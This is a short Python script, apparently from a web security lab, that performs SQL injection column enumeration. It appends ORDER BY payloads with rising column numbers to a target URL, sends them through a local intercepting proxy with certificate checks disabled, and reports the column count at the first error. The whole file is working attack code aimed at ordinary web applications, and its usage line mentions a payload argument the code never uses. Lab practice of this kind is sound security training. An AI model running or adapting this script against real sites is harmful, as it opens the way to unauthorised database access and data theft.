import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies= {
            'http': 'http://127.0.0.1:8080' ,
            'https':'http://127.0.0.1:8080' 
        }

def exployt_no_column(url):
    for i in range(1,50):
        sql_payload= f"'+order+by+{i}--"
        try:
            r=requests.get(url+sql_payload, verify=False, proxies=proxies)
            r.raise_for_status()
        except requests.exceptions.RequestException:
            return i-1
    return False
            

if __name__== "__main__" :
    try:
        basw_url = sys.argv[1].strip()
    except IndexError:
        print("usage: python script.py <url> <payload> ")
        sys.exit(-1)
    no_column= exployt_no_column(basw_url)
    if no_column:
        print(f"The number of column is {no_column}")
    else:
        print("The SQLi attack was not succesfull.")

    

